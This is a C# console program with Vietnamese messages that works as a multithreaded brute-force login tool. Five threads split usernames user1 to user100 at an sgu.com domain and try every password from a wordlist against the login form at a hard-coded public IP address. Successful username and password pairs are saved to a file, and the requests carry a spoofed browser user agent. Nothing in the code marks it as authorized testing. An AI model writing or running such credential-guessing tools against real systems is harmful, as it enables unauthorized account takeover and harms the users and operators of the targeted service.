using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using xNet;

namespace ConsoleApp2
{
    class Program
    {
        public static List<string> success = new List<string>();
        public static string[] array;
      
        public static bool isRunning = true;
        static void Main(string[] args)
        {

            if (!File.Exists("list.txt"))
            {
                Console.WriteLine("Không tìm thấy file");
                return;
            }
            array = File.ReadAllLines("list.txt");
            new Thread(new ThreadStart(thread1)).Start();
            new Thread(new ThreadStart(thread2)).Start();
            new Thread(new ThreadStart(thread3)).Start();
            new Thread(new ThreadStart(thread4)).Start();
            new Thread(new ThreadStart(thread5)).Start();


        }
        public static void thread1()
        {
            while (isRunning)
            {
                try
                {

                    for (int i = 1; i < 20; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("STT[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                            Thread.Sleep(100);
                        }
                    }

                    Console.WriteLine("Thread 1 xong ");
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Lỗi " + e.ToString());
                }
            }
        }
        public static void thread2()
        {
            while (isRunning)
            {
                try
                {

                    for (int i = 20; i < 40; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("STT[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                            Thread.Sleep(100);
                        }
                    }
                    Console.WriteLine("Thread 1 xong ");
                    break;
                }
                catch (Exception e)
                {
                     Console.WriteLine("Lỗi " + e.ToString());;
                }
            }
        }
        public static void thread3()
        {
            while (isRunning)
            {
                try
                {

                    for (int i = 40; i < 60; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("STT[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                            Thread.Sleep(100);
                        }
                    }
                    Console.WriteLine("Thread 1 xong ");
                    break;
                }
                catch (Exception e)
                {
                     Console.WriteLine("Lỗi " + e.ToString());;
                }
            }
        }
        public static void thread4()
        {
            while (isRunning)
            {
                try
                {

                    for (int i = 60; i < 80; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("STT[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                            Thread.Sleep(100);
                        }
                    }
                    Console.WriteLine("Thread 4 xong ");
                    break;
                }
                catch (Exception e)
                {
                     Console.WriteLine("Lỗi " + e.ToString());;
                }
            }
        }
        public static void thread5()
        {
            while (isRunning)
            {
                try
                {

                    for (int i = 80; i < 101; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("STT[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                            Thread.Sleep(100);
                        }
                    }
                    Console.WriteLine("Thread 5 xong ");
                    break;
                }
                catch (Exception e)
                {
                     Console.WriteLine("Lỗi " + e.ToString());;
                }
            }
        }
    }
}
